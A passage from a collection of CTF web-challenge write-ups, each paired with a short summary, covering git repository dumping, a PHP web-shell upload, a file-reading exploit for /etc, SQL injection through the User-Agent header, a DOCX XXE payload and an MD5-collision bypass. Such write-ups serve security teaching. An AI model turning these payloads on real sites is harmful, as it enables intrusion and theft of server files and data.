But [URL containing parameters that appear to be executing a system command to print the current user's ID.] will be blocked by the `is_payload_danger` method.

With some analysis, you can discover that `fread` and `fopen` are available, so you can read `config.php` with a payload, specifying the `config.php` filename in another GET parameter to bypass the check.

The response is a base64 encoded string, decoding you can discover the source code.

[PHP function that checks if a given string (presumably user input) contains any potentially dangerous code or commands that could be executed on the server.]

Using `glob` function, which is not blocked, you can find the flag file that can be read with the technique used before.

"
"# DarkCON CTF 2021 – Meme_Stash

* **Category:** web
* **Points:** ?

## Challenge

> White Wolf cloned this website for some memes while browsing some memes he stumbled upon the flag but now he is not able to find it can you help him
> 
> Note: This chall does not require any brute forcing
> 
> http://meme-stash.darkarmy.xyz/

## Solution

A basic enumeration will reveal the presence of a Git repository.

```
root@m3ss4p0:~# dirb http://meme-stash.darkarmy.xyz/ /usr/share/dirb/wordlists/common.txt -z 200

http://meme-stash.darkarmy.xyz/.git/HEAD
```

So you can use [git-dumper](https://github.com/arthaud/git-dumper) to dump all the repository.

```
root@m3ss4p0:~/Tools/git-dumper# ./git-dumper.py http://meme-stash.darkarmy.xyz/.git/ ../../meme-stash
[-] Testing http://meme-stash.darkarmy.xyz/.git/HEAD [200]
[-] Testing http://meme-stash.darkarmy.xyz/.git/ [403]
[-] Fetching common files
[-] Fetching http://meme-stash.darkarmy.xyz/.git/description [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/hooks/commit-msg.sample [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.gitignore [404]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/hooks/post-receive.sample [404]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/hooks/pre-applypatch.sample [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/COMMIT_EDITMSG [404]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/hooks/applypatch-msg.sample [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/hooks/post-commit.sample [404]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/hooks/post-update.sample [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/hooks/pre-commit.sample [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/hooks/pre-push.sample [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/index [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/hooks/prepare-commit-msg.sample [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/hooks/update.sample [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/hooks/pre-rebase.sample [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/hooks/pre-receive.sample [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/info/exclude [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/objects/info/packs [404]
[-] Finding refs/
[-] Fetching http://meme-stash.darkarmy.xyz/.git/config [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/logs/refs/remotes/origin/HEAD [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/FETCH_HEAD [404]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/HEAD [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/logs/HEAD [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/ORIG_HEAD [404]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/info/refs [404]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/logs/refs/stash [404]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/logs/refs/remotes/origin/master [404]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/logs/refs/heads/master [404]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/packed-refs [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/refs/heads/master [404]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/refs/remotes/origin/HEAD [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/refs/heads/main [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/refs/remotes/origin/master [404]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/refs/stash [404]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/refs/remotes/origin/main [404]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/refs/wip/index/refs/heads/master [404]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/refs/wip/wtree/refs/heads/master [404]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/logs/refs/heads/main [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/logs/refs/remotes/origin/main [404]
[-] Finding packs
[-] Finding objects
[-] Fetching objects
[-] Fetching http://meme-stash.darkarmy.xyz/.git/objects/8f/e8fb21b73bceac61db2bcc7b72d31a9b564e6d [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/objects/00/00000000000000000000000000000000000000 [404]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/objects/2c/dfab38e64a1a97e02d6bbe3801ca51d508aed2 [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/objects/74/7f8b0e2915bb6185848e2a27b6cb2e37be6d83 [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/objects/99/504cd1398a7f7ec3a5baaaa05e297c61c2189d [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/objects/83/7cdbe893ac96998e2c5f523b906c519ec5005a [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/objects/33/4ed6aeb833d46f81e5882b4c6f6712e9b071b9 [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/objects/2a/e8ba9e461f9c44f86fb9bdbfae9a2f82a1a032 [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/objects/5a/7136b7eb012e790511efa69e39326e4c569e22 [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/objects/74/3414208ede0f80fd5fd821e0756916378c8aba [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/objects/3d/cdc9d93ab5b05228c3e4950d57a1c24751eb01 [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/objects/91/010559a7387a3b24d157a0e32acbd60339db00 [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/objects/14/6831302c94e3dfed16c9a90baed8770a82b544 [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/objects/a1/8518b0133ce59be487bd61a675a2130238ac98 [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/objects/dc/5774b462a1b9706538026cea32d72498ea8797 [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/objects/15/f0c294c29663d22ed07841bd0f863c79daf5a0 [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/objects/43/0b29a5542aaa222aff94b3c19bc80961aff64b [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/objects/59/d72179a0ca8cc03132d6ce30c8ca4bc9ad3a34 [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/objects/e1/287a203c205104af6474d8ba188366653b772c [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/objects/51/f6f6560cf4edd5f6f8b59c141c3dbce916a20b [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/objects/d6/c0c5a409c9ec655a8dde53f1d998f723a90fcb [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/objects/ee/bd2bb56a17352de1e6cc9b3aee66fe8a2cdb5e [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/objects/2e/fb9de5b8bae537662db67ae959c828c95496b4 [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/objects/a0/ecc15b44e86be4472eec30a2947f568f00f5b0 [200]
[-] Fetching http://meme-stash.darkarmy.xyz/.git/objects/ba/a389503d746fe8977f7f888ba72f280891e6bd [200]
[-] Running git checkout .
```

With `git log` you can discover a commit (i.e. `747f8b0e2915bb6185848e2a27b6cb2e37be6d83`) with a suspect message (i.e. `oops`). 

```
root@m3ss4p0:~/Tools/git-dumper# cd ../../meme-stash/meme-stash
root@m3ss4p0:~/meme-stash/meme_stash# git log
commit 747f8b0e2915bb6185848e2a27b6cb2e37be6d83 (HEAD -> main, origin/main, origin/HEAD)
Author: karma9874 <33444666+karma9874@users.noreply.github.com>
Date:   Wed Feb 3 16:45:49 2021 +0530

    oops

commit 146831302c94e3dfed16c9a90baed8770a82b544
Author: karma9874 <33444666+karma9874@users.noreply.github.com>
Date:   Wed Feb 3 16:44:57 2021 +0530

    added some memes xD

commit e1287a203c205104af6474d8ba188366653b772c
Author: karma9874 <33444666+karma9874@users.noreply.github.com>
Date:   Wed Feb 3 16:44:10 2021 +0530

    added js and css

commit eebd2bb56a17352de1e6cc9b3aee66fe8a2cdb5e
Author: karma9874 <33444666+karma9874@users.noreply.github.com>
Date:   Wed Feb 3 16:42:22 2021 +0530

    added html file
```

Probably the flag was present before that commit and has been removed. For this reason you can compare commits.

```
root@m3ss4p0:~/meme-stash/meme_stash# git diff 747f8b0e2915bb6185848e2a27b6cb2e37be6d83 146831302c94e3dfed16c9a90baed8770a82b544
diff --git a/index.html b/index.html
index 9101055..d6c0c5a 100644
--- a/index.html
+++ b/index.html
@@ -46,6 +46,10 @@
     <img src=""meme_stash/9.jpg"" >
   </div>
 
+  <div class=""slide"" style=""background: #7edf10;"">
+    <img src=""meme_stash/flag.jpg"" >
+  </div>
+
 
   <span class=""controls"" onclick=""prevSlide(-1)"" id=""left-arrow""><i class=""fa fa-arrow-left"" aria-hidden=""true""></i>
 </span>
@@ -54,7 +58,7 @@
 </div>
   <div id=""dots-con"">
  <span class=""dot""></span><span class=""dot""></span><span class=""dot""></span><span class=""dot""></span><span class=""dot""></span>
- <span class=""dot""></span><span class=""dot""></span><span class=""dot""></span><span class=""dot""></span></span>
+ <span class=""dot""></span><span class=""dot""></span><span class=""dot""></span><span class=""dot""></span></span><span class=""dot""></span>
  </div>
 
   <script  src=""./script.js""></script>
diff --git a/meme_stash/flag.jpg b/meme_stash/flag.jpg
new file mode 100644
index 0000000..a0ecc15
Binary files /dev/null and b/meme_stash/flag.jpg differ
```

The previous commit (i.e. `146831302c94e3dfed16c9a90baed8770a82b544`) contained the flag. You can restore that file checking out the commit.

```
root@m3ss4p0:~/meme-stash/meme_stash# git checkout 146831302c94e3dfed16c9a90baed8770a82b544
root@m3ss4p0:~/meme-stash/meme_stash# ls
1.jpg  2.jpg  3.jpg  4.jpg  5.jpg  6.jpg  7.jpeg  8.jpeg  9.jpg  flag.jpg
```

![flag.jpg](flag.jpg)

The flag is the following.

```
darkCON{g1t_d4_fl4g}
```","A basic enumeration will reveal the presence of a Git repository.

So you can use git-dumper to dump all the repository.

With `git log` you can discover a commit with a suspect message. 

Probably the flag was present before that commit and has been removed. For this reason you can compare commits using 'git diff'.

The previous commit contained the flag. You can restore that file checking out the commit and get the flag."
"# DarkCON CTF 2021 – WTF PHP

* **Category:** web
* **Points:** 269

## Challenge

> Your php function didnt work? maybe some info will help you xD PS: Flag is somewhere in /etc Note: This chall does not require any brute forcing
> 
> http://wtf-php.darkarmy.xyz/

## Solution

The website allows to upload a file. Analyzing the HTML you can discover an interesting comment containing a PHP snippet.

```html
<html>
   <body>
      <form action="""" method=""POST"" enctype=""multipart/form-data"">
         <input type=""file"" name=""fileData"" />
         <input type=""submit""/>
      </form>
   </body>
<!--
   if(isset($_FILES['fileData'])){
      if($_FILES['fileData']['size'] > 1048576){
         $errors='File size must be excately 1 MB';
      }

      if(empty($errors)==true){
        $uploadedPath = ""uploads/"".rand().""."".explode(""."",$_FILES['fileData']['name'])[1];
        move_uploaded_file($_FILES['fileData']['tmp_name'],$uploadedPath);
        echo ""File uploaded successfully\n"";
        echo '<p><a href='. $uploadedPath .' target=""_blank"">File</a></p>';
      }else{
         echo $errors;
      }
   }
-->

</html>
```

The website returns you a link to the uploaded file, it renames the file with a random value preserving the extension. So, a PHP shell can be uploaded and visited executing its content.

```php
<?php
    echo ""<h1>Exploit Output</h1><br /><code>"";
    echo system($_GET[c]);
    echo ""</code>"";
?>
```

Unfortunately the RCE doesn't work, but the text says:

> maybe some info will help you xD

So you can try to understand what's happening using `phpinfo()`.

```php
<?php
    echo ""<h1>Exploit Output</h1><br /><hr /><code>"";
    echo system($_GET[c]);
    echo ""</code><hr />"";
    echo phpinfo();
?>
```

Some functions are disabled, you can see them under `disable_functions` section of `phpinfo()` output.

```
pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,error_log,link,symlink,syslog,ld,mail,exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source,highlight_file,file,fopen,fread,var_dump,readfile
```

`scandir` and `file_get_contents` are not disabled and the flag is under `/etc`.

A simple [exploit](exploit.php) can be created and uploaded.

```php
<?php
    echo ""<h1>Exploit Output</h1><br /><hr />"";
    $dir = ""/etc/"";
    $items = scandir($dir);
    foreach($items as $key => $value) {
        $file = $dir . $value;
        if(is_file($file)) {
            $file_content = file_get_contents($file);
            if(strpos($file_content, ""darkCON{"") !== false) {
                echo ""<p>File name: $file</p><br />File content:<br /><code>"";
                echo $file_content;
                echo ""</code>"";
            }
        }
    }
    echo ""<hr />"";
    echo phpinfo();
?>
```

The exploit output will be the following.

```
File name: /etc/f1@g.txt


File content:
darkCON{us1ng_3_y34r_01d_bug_t0_byp4ss_d1s4ble_funct10n}
```","The website allows to upload a file. Analyzing the HTML you can discover an interesting comment containing a PHP snippet.

The website returns you a link to the uploaded file, it renames the file with a random value preserving the extension. So, a PHP shell can be uploaded and visited executing its content.

Unfortunately the RCE doesn't work, but the text says: 'maybe some info will help you'.

So you can try to understand what's happening using `phpinfo()`.

Some functions are disabled, you can see them under `disable_functions` section of `phpinfo()` output.

`scandir` and `file_get_contents` are not disabled and the flag is under `/etc`.

A simple exploit.php can be created and uploaded.

[PHP code that reads the contents of every file in the ""/etc/"" directory and outputs the contents of any file that contains the string ""darkCON{"". It also outputs information about the PHP environment using the ""phpinfo()"" function.]

The exploit output will contains the flag."
"# DarkCTF 2020 – Agent-U

* **Category:** web
* **Points:** 395

## Challenge

> Agent U stole a database from my company but I don't know which one. Can u help me to find it?
> 
> http://agent.darkarmy.xyz/
> 
> flag format darkCTF{databasename}

## Solution

Connecting to the web site will give you an authentication form with your IP printed on it. The title of the challenge seems related to the *User-Agent* string.

```html
<!DOCTYPE html>
<html>
<head>
<title>Agent U</title>
</head>

<body>

<center><font color=red><h1>Welcome Players To MY Safe House</h1></font></center> <br><br><br>

<form action="""" name=""form1"" method=""post"">
<center>
<font color=yellow> Username : </font><input type=""text""  name=""uname"" value=""""/>  <br> <br>

<font color=yellow> Password : </font> <input type=""text"" name=""passwd"" value=""""/></br> <br>
<input type=""submit"" name=""submit"" value=""Submit"" />
</center></form>
<font size=""3"" color=""#FFFF00"">

	<br><!-- TRY DEFAULT LOGIN admin:admin --> <br>




<br>Your IP ADDRESS is: x.x.x.x<br>

</font>
</div>
</body>
</html>
```

Analyzing the HTML source code, you can discover default credentials. Using them will print your User-Agent and an image.

```html
<!DOCTYPE html>
<html>
<head>
<title>Agent U</title>
</head>

<body>

<center><font color=red><h1>Welcome Players To MY Safe House</h1></font></center> <br><br><br>

<form action="""" name=""form1"" method=""post"">
<center>
<font color=yellow> Username : </font><input type=""text""  name=""uname"" value=""""/>  <br> <br>

<font color=yellow> Password : </font> <input type=""text"" name=""passwd"" value=""""/></br> <br>
<input type=""submit"" name=""submit"" value=""Submit"" />
</center></form>
<font size=""3"" color=""#FFFF00"">

	<br><!-- TRY DEFAULT LOGIN admin:admin --> <br>




<br>Your IP ADDRESS is: x.x.x.x<br><font color= ""#FFFF00"" font size = 3 ></font><font color= ""#0000ff"" font size = 3 >Your User Agent is: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0</font><br><br><br><img src=""vibes.png""  /><br>

</font>
</div>
</body>
</html>
```

The usage of `X-Forwarded-For: 127.0.0.1` doesn't alter the IP address.

The challenge talks about a database, so trying to alter the User-Agent during authentication will give you a SQL error. *SQL injection* is possible via User-Agent string.

```
POST / HTTP/1.1
Host: agent.darkarmy.xyz
User-Agent: '
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 38
Origin: http://agent.darkarmy.xyz
Connection: close
Referer: http://agent.darkarmy.xyz/
Cookie: __cfduid=db2eda04fd2928b25481f8352b452e3151601110047
Upgrade-Insecure-Requests: 1

uname=admin&passwd=admin&submit=Submit


HTTP/1.1 200 OK
Date: Sat, 26 Sep 2020 08:54:56 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
X-Powered-By: PHP/7.2.33
Vary: Accept-Encoding
CF-Cache-Status: DYNAMIC
cf-request-id: 056b386df800000f621202d200000001
Server: cloudflare
CF-RAY: 5d8bc35ccbb30f62-MXP
Content-Length: 989

<!DOCTYPE html>
<html>
<head>
<title>Agent U</title>
</head>

<body>

<center><font color=red><h1>Welcome Players To MY Safe House</h1></font></center> <br><br><br>

<form action="""" name=""form1"" method=""post"">
<center>
<font color=yellow> Username : </font><input type=""text""  name=""uname"" value=""""/>  <br> <br>

<font color=yellow> Password : </font> <input type=""text"" name=""passwd"" value=""""/></br> <br>
<input type=""submit"" name=""submit"" value=""Submit"" />
</center></form>
<font size=""3"" color=""#FFFF00"">

	<br><!-- TRY DEFAULT LOGIN admin:admin --> <br>




<br>Your IP ADDRESS is: x.x.x.x<br><font color= ""#FFFF00"" font size = 3 ></font><font color= ""#0000ff"" font size = 3 >Your User Agent is: '</font><br>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'x.x.x.x', 'admin')' at line 1<br><br><img src=""vibes.png""  /><br>

</font>
</div>
</body>
</html>
```

So you have to leak the database name. The problem is that this query is an `INSERT` one, so you need to apply an appropriate approach. You can use an [error based approach via `Updatexml()`](https://osandamalith.com/2017/02/08/mysql-injection-in-update-insert-and-delete/).

The correct payload is the following.

```sql
'or updatexml(0,concat(0x7e,(SELECT database())),0) or'', '127.0.0.1', 'admin') #
```

```
POST / HTTP/1.1
Host: agent.darkarmy.xyz
User-Agent: 'or updatexml(0,concat(0x7e,(SELECT database())),0) or'', '127.0.0.1', 'admin') #
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 38
Origin: http://agent.darkarmy.xyz
Connection: close
Referer: http://agent.darkarmy.xyz/
Cookie: __cfduid=db2eda04fd2928b25481f8352b452e3151601110047
Upgrade-Insecure-Requests: 1

uname=admin&passwd=admin&submit=Submit


HTTP/1.1 200 OK
Date: Sat, 26 Sep 2020 09:29:10 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
X-Powered-By: PHP/7.2.33
Vary: Accept-Encoding
CF-Cache-Status: DYNAMIC
cf-request-id: 056b57c35500000f7e720c8200000001
Server: cloudflare
CF-RAY: 5d8bf57eebb20f7e-MXP
Content-Length: 944

<!DOCTYPE html>
<html>
<head>
<title>Agent U</title>
</head>

<body>

<center><font color=red><h1>Welcome Players To MY Safe House</h1></font></center> <br><br><br>

<form action="""" name=""form1"" method=""post"">
<center>
<font color=yellow> Username : </font><input type=""text""  name=""uname"" value=""""/>  <br> <br>

<font color=yellow> Password : </font> <input type=""text"" name=""passwd"" value=""""/></br> <br>
<input type=""submit"" name=""submit"" value=""Submit"" />
</center></form>
<font size=""3"" color=""#FFFF00"">

	<br><!-- TRY DEFAULT LOGIN admin:admin --> <br>




<br>Your IP ADDRESS is: x.x.x.x<br><font color= ""#FFFF00"" font size = 3 ></font><font color= ""#0000ff"" font size = 3 >Your User Agent is: 'or updatexml(0,concat(0x7e,(SELECT database())),0) or'', '127.0.0.1', 'admin') #</font><br>XPATH syntax error: '~ag3nt_u_1s_v3ry_t3l3nt3d'<br><br><img src=""vibes.png""  /><br>

</font>
</div>
</body>
</html>
```

The flag is composed with the database name, so it is the following.

```
darkCTF{ag3nt_u_1s_v3ry_t3l3nt3d}
```","Connecting to the web site will give you an authentication form with your IP printed on it. The title of the challenge seems related to the *User-Agent* string.

Analyzing the HTML source code, you can discover default credentials. Using them will print your User-Agent and an image.

The usage of `X-Forwarded-For: 127.0.0.1` doesn't alter the IP address.

The challenge talks about a database, so trying to alter the User-Agent during authentication will give you a SQL error. SQL injection is possible via User-Agent string.

So you have to leak the database name. The problem is that this query is an `INSERT` one, so you need to apply an appropriate approach. You can use an [error based approach via Updatexml().

The flag is composed with the database name."
"# DarkCTF 2020 – File Reader

* **Category:** web
* **Points:** 494?

## Challenge

> My friend developed this website but he says user should know some Xtreme > Manipulative Language to understand this web.
> 
> Flag is in /flag.txt
> 
> http://filereader.darkarmy.xyz/

## Solution

The web site is a form to upload files. Reading the challenge description, an *XXE* should be involved.

The form allows only PDF and DOCX files.

Uploading a DOCX file, you can notice that some information are shown. One of them is the number of pages.

DOCX files are archives of files where XML documents are present.

It is sufficient to create a DOCX and to alter the [`test.docx\docProps\app.xml`](app.xml) file, where the number of pages is stored, like the following.

```xml
<?xml version=""1.0"" encoding=""UTF-8"" standalone=""yes""?>
<!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM ""file:///flag.txt"" >]>
<Properties xmlns=""http://schemas.openxmlformats.org/officeDocument/2006/extended-properties"" xmlns:vt=""http://schemas.openxmlformats.org/officeDocument/2006/docPropsVTypes""><Template>Normal.dotm</Template><TotalTime>0</TotalTime><Pages>&xxe;</Pages><Words>0</Words><Characters>4</Characters><Application>Microsoft Office Word</Application><DocSecurity>0</DocSecurity><Lines>1</Lines><Paragraphs>1</Paragraphs><ScaleCrop>false</ScaleCrop><Company>Reply</Company><LinksUpToDate>false</LinksUpToDate><CharactersWithSpaces>4</CharactersWithSpaces><SharedDoc>false</SharedDoc><HyperlinksChanged>false</HyperlinksChanged><AppVersion>16.0000</AppVersion></Properties>
```

Uploading the file in the web application will return the flag where the number of pages is shown. The flag will be the following.

```
darkCTF{1nj3ct1ng_d0cx_f0r_xx3}
```","The web site is a form to upload files. Reading the challenge description, an XXE should be involved.

The form allows only PDF and DOCX files.

Uploading a DOCX file, you can notice that some information are shown. One of them is the number of pages.

DOCX files are archives of files where XML documents are present.

It is sufficient to create a DOCX and to alter the app.xml file, where the number of pages is stored.

Uploading the file in the web application will return the flag where the number of pages is shown."
"# DarkCTF 2020 – PHP İnformation

* **Category:** web
* **Points:** 198

## Challenge

> Let's test your php knowledge.
> 
> Flag Format: DarkCTF{}
> 
> http://php.darkarmy.xyz:7001

## Solution

Connecting to the web page will give you the following PHP source code.

```php
<?php

include ""flag.php"";

echo show_source(""index.php"");


if (!empty($_SERVER['QUERY_STRING'])) {
    $query = $_SERVER['QUERY_STRING'];
    $res = parse_str($query);
    if (!empty($res['darkctf'])){
        $darkctf = $res['darkctf'];
    }
}

if ($darkctf === ""2020""){
    echo ""<h1 style='color: chartreuse;'>Flag : $flag</h1></br>"";
}

if ($_SERVER[""HTTP_USER_AGENT""] === base64_decode(""MjAyMF90aGVfYmVzdF95ZWFyX2Nvcm9uYQ=="")){
    echo ""<h1 style='color: chartreuse;'>Flag : $flag_1</h1></br>"";
}


if (!empty($_SERVER['QUERY_STRING'])) {
    $query = $_SERVER['QUERY_STRING'];
    $res = parse_str($query);
    if (!empty($res['ctf2020'])){
        $ctf2020 = $res['ctf2020'];
    }
    if ($ctf2020 === base64_encode(""ZGFya2N0Zi0yMDIwLXdlYg=="")){
        echo ""<h1 style='color: chartreuse;'>Flag : $flag_2</h1></br>"";
                
        }
    }



    if (isset($_GET['karma']) and isset($_GET['2020'])) {
        if ($_GET['karma'] != $_GET['2020'])
        if (md5($_GET['karma']) == md5($_GET['2020']))
            echo ""<h1 style='color: chartreuse;'>Flag : $flag_3</h1></br>"";
        else
            echo ""<h1 style='color: chartreuse;'>Wrong</h1></br>"";
    }



?>
```

You have to satisfy all checks to print the flag.

For the last check you have to find [two colliding MD5 strings](https://crypto.stackexchange.com/questions/1434/are-there-two-known-strings-which-have-the-same-md5-hash-value). Based on [this example](https://ideone.com/UyP22Z) you can write your [script](md5_collisions.php) to generate the URL-encoded version of the original strings for which hexadecimal values are provided.

```php
<?php

$hex1 = '4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa200a8284bf36e8e4b55b35f427593d849676da0d1555d8360fb5f07fea2';
$hex2 = '4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa202a8284bf36e8e4b55b35f427593d849676da0d1d55d8360fb5f07fea2';

$bin1 = hex2bin($hex1);
$bin2 = hex2bin($hex2);

if ($bin1 == $bin2)
	echo 'The binary data is the same' . PHP_EOL;
else 
	echo 'The binary data is not the same' . PHP_EOL . PHP_EOL;

$md51 = md5($bin1);
$md52 = md5($bin2);

echo 'MD5 hash for binary #1: ' . $md51 . PHP_EOL;
echo 'MD5 hash for binary #2: ' . $md52 . PHP_EOL;

if ($md51 == $md52)
	echo 'The MD5 hashes are the same' . PHP_EOL;
else 
	echo 'The MD5 hashes are not the same' . PHP_EOL;

$urlencoded1 = urlencode($bin1);
$urlencoded2 = urlencode($bin2);
echo PHP_EOL;
echo 'The urlencoded #1 is: '. $urlencoded1 . PHP_EOL;
echo 'The urlencoded #2 is: '. $urlencoded2 . PHP_EOL;
```

The script will give you the strings.

```
The binary data is not the same

MD5 hash for binary #1: 008ee33a9d58b51cfeb425b0959121c9
MD5 hash for binary #2: 008ee33a9d58b51cfeb425b0959121c9
The MD5 hashes are the same

The urlencoded #1 is: M%C9h%FF%0E%E3%5C+%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2
The urlencoded #2 is: M%C9h%FF%0E%E3%5C+%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2
```

So you can craft the complete request.

```
GET /?darkctf=2020&ctf2020=WkdGeWEyTjBaaTB5TURJd0xYZGxZZz09&karma=M%C9h%FF%0E%E3%5C+%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&2020=M%C9h%FF%0E%E3%5C+%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2 HTTP/1.1
Host: php.darkarmy.xyz:7001
User-Agent: 2020_the_best_year_corona
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```

The webpage will give you the following.

```html
<h1 style='color: chartreuse;'>Flag : DarkCTF{</h1></br><h1 style='color: chartreuse;'>Flag : very_</h1></br><h1 style='color: chartreuse;'>Flag : nice</h1></br><h1 style='color: chartreuse;'>Flag : _web_challenge_dark_ctf}</h1>
```

The flag is the following.

```
DarkCTF{very_nice_web_challenge_dark_ctf}
```","Connecting to the web page will give you the following PHP source code.

[PHP code with various conditional statements that check user input and output different strings based on the input. Some strings include a flag variable that is concatenated with HTML code and displayed on the page.]

You have to satisfy all checks to print the flag.

For the last check you have to find two colliding MD5 strings. You can write your php script to generate the URL-encoded version of the original strings for which hexadecimal values are provided.

The script will give you the strings.

So you can craft the complete request.

The webpage will give you the flag."
"## Free Wi-Fi Part 1

* **Category:** web/networking
* **Points:** 50

### Challenge

> People are getting online here, but the page doesn't seem to be implemented...I ran a pcap to see what I could find out.
> 
> http://freewifi.ctf.umbccd.io/
> 
> Authors: pleoxconfusa and freethepockets

### Solution

The HTML code of the page is the following.

```html
<!DOCTYPE html>
<html>
  <head>
    <title>
Guest Sign In Portal
</title>
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">

    <!-- Bootstrap -->
    <link href=""/static/bootstrap/css/bootstrap.min.css?bootstrap=3.3.7.1.dev1"" rel=""stylesheet"">
	<link rel=""stylesheet"" href=""/static/css/main.css"">

  </head>
  <body>
    
    

<div class=""container"">
  <div class=""row"">
    <div align=""center"" class=""col-xs-12"">

      <h1>Sorry!</h1>

      <br><br>

      <div align=""left"" style=""background-color: lightgrey; width: 500px;  padding: 50px;  margin: 20px;"">
	<h3 style=""color:blue;"">Guest login</h3>
      	<p class=""space-above""><strong>Guest sign in portal is not yet implemented.</strong></p>
      </div>

    </div>
  </div>
</div>



    
    <script src=""/static/bootstrap/jquery.min.js?bootstrap=3.3.7.1.dev1""></script>
    <script src=""/static/bootstrap/js/bootstrap.min.js?bootstrap=3.3.7.1.dev1""></script>
